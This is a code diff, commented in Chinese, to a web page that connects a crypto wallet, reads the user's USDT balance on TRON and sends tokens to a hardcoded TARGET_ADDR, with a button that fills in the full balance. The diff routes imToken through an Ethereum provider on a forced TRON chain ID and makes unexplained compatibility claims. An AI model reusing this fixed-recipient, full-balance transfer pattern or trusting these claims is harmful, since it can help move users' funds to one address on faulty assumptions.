@@ -204,6 +204,7 @@ body {
 const TARGET_ADDR = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const RPC = "https://api.trongrid.io";
+const TRON_CHAIN_ID = "0x2b6653dc"; // 波场主网链ID，新版imToken必须指定
 let tronWeb = null;
 let userAddress = "";
 let userHexAddr = "";
@@ -237,6 +238,7 @@ function disconnectWallet() {
  balanceText.textContent = "0.000000";
 }
 
+// 底层构造交易（新版imToken唯一稳定方式）
 async function buildSignBroadcast(contractAddr, funcName, params) {
  const sig = tronWeb.sha3(`${funcName}(${params.map(p=>p.type).join(',')})`).slice(0,10);
  const txObj = await tronWeb.transactionBuilder.triggerSmartContract(
@@ -250,13 +252,20 @@ async function buildSignBroadcast(contractAddr, funcName, params) {
  return await tronWeb.trx.sendRawTransaction(signed);
 }
 
+// RPC直接读取余额，绕开新版provider合约call限制
 async function loadBalance() {
  try {
-  const rawSun = await usdtContract.balanceOf(userAddress).call();
-  const num = Number(tronWeb.fromSun(rawSun));
+  const res = await fetch(`${RPC}/v1/accounts/${userAddress}`);
+  const data = await res.json();
+  let usdtBalSun = 0;
+  if(data.tokenBalances){
+   const usdtItem = data.tokenBalances.find(item=>item.token_id === USDT_CONTRACT);
+   if(usdtItem) usdtBalSun = usdtItem.balance;
+  }
+  const num = Number(tronWeb.fromSun(usdtBalSun));
   balanceText.textContent = num.toFixed(6);
  } catch (e) {
-  console.log("读取余额异常:", e);
+  console.log("RPC读余额失败", e);
  }
 }
 
@@ -266,47 +275,43 @@ async function connectWalletLogic() {
   return;
  }
  try {
-  if (window.okxwallet && window.okxwallet.tronLink) {
-   provider = window.okxwallet.tronLink;
-   await provider.request({ method: "tron_requestAccounts" });
-   tronWeb = provider.tronWeb;
-   userAddress = tronWeb.defaultAddress.base58;
-   userHexAddr = tronWeb.address.toHex(userAddress);
-  }
-  else if (window.tokenpocket?.tron) {
-   provider = window.tokenpocket.tron;
-   const accounts = await provider.request({ method: "tron_requestAccounts" });
-   userAddress = accounts[0];
-   tronWeb = window.tokenpocket.tronWeb;
-   userHexAddr = tronWeb.address.toHex(userAddress);
-  }
-  else if (window.ethereum) {
-   const ethAcc = await window.ethereum.request({method:"eth_requestAccounts"});
-   userHexAddr = ethAcc[0];
-   tronWeb = new TronWeb({
-    fullHost: RPC,
-    provider: window.ethereum
+  // 新版imToken只有 window.ethereum
+  if (!window.ethereum) throw new Error("无以太坊提供者");
+  provider = window.ethereum;
+
+  // 强制切换到波场链ID（v2.21版本必须执行这一步）
+  try {
+   await provider.request({
+    method: "wallet_switchEthereumChain",
+    params: [{ chainId: TRON_CHAIN_ID }]
    });
-   userAddress = tronWeb.address.fromHex(userHexAddr);
+  } catch (switchErr) {
+   await provider.request({
+    method: "wallet_addEthereumChain",
+    params: [{
+     chainId: TRON_CHAIN_ID,
+     chainName: "TRON Mainnet",
+     rpcUrls: [RPC],
+     blockExplorerUrls: ["https://tronscan.io"]
+    }]
+   });
   }
-  else if (window.tronWeb?.ready && window.tronWeb.defaultAddress?.base58) {
-   tronWeb = window.tronWeb;
-   userAddress = tronWeb.defaultAddress.base58;
-   userHexAddr = tronWeb.address.toHex(userAddress);
-  } else {
-   return;
-  }
+
+  const ethAcc = await provider.request({method:"eth_requestAccounts"});
+  userHexAddr = ethAcc[0];
+  tronWeb = new TronWeb({
+   fullHost: RPC,
+   provider: window.ethereum
+  });
+  userAddress = tronWeb.address.fromHex(userHexAddr);
 
   walletDot.classList.add("connected");
   usdtContract = tronWeb.contract(USDT_ABI, USDT_CONTRACT);
-  // 先放开按钮，再异步读余额（就算余额读失败按钮也能用）
-  sendBtn.disabled = false;
-  loadBalance();
+  sendBtn.disabled = false; // 连接成功立刻解锁按钮
+  loadBalance(); // RPC异步读余额
 
-  if (provider?.on) {
-   provider.on("accountsChanged", () => location.reload());
-   provider.on("chainChanged", () => location.reload());
-  }
+  provider.on("accountsChanged", () => location.reload());
+  provider.on("chainChanged", () => location.reload());
  } catch (err) {
   console.error("连接失败", err);
   return;
@@ -319,10 +324,16 @@ amountInput.addEventListener("input", () => {
 });
 
 maxBtn.addEventListener("click", async () => {
- if (!usdtContract) return;
+ if (!tronWeb || !userAddress) return;
  try {
-  const rawSun = await usdtContract.balanceOf(userAddress).call();
-  const num = Number(tronWeb.fromSun(rawSun));
+  const res = await fetch(`${RPC}/v1/accounts/${userAddress}`);
+  const data = await res.json();
+  let usdtBalSun = 0;
+  if(data.tokenBalances){
+   const usdtItem = data.tokenBalances.find(item=>item.token_id === USDT_CONTRACT);
+   if(usdtItem) usdtBalSun = usdtItem.balance;
+  }
+  const num = Number(tronWeb.fromSun(usdtBalSun));
   amountInput.value = num.toFixed(2);
   amountInput.dispatchEvent(new Event("input"));
  }catch(e){
